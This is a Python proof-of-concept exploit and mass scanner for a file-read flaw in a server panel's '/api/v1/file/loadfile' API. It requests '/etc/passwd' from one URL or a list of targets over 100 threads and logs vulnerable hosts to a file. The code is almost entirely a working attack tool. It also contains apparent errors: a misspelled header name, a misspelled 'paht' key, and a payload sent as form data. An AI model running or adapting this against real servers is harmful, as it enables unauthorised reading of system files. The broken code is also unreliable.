import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """________                   ______   ______            __________________________     
___  __ \_____ _______________  /   ___  /___________ ______  /__  __/__(_)__  /____ 
__  /_/ /  __ `/_  __ \  _ \_  /    __  /_  __ \  __ `/  __  /__  /_ __  /__  /_  _ \
_  ____// /_/ /_  / / /  __/  /     _  / / /_/ / /_/ // /_/ / _  __/ _  / _  / /  __/
/_/     \__,_/ /_/ /_/\___//_/      /_/  \____/\__,_/ \__,_/  /_/    /_/  /_/  \___/ 
                                                                                     """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='Panel loadfile 后台文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/api/v1/file/loadfile'
    headers = {
        'Conten-Type':'application/json'
    }
    json = {"paht":"/etc/passwd"}
    try:
        res = requests.post(url=target+payload,headers=headers,data=json,verify=False,timeout=10)
        if res.status_code == 200 and '/bin/bash' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()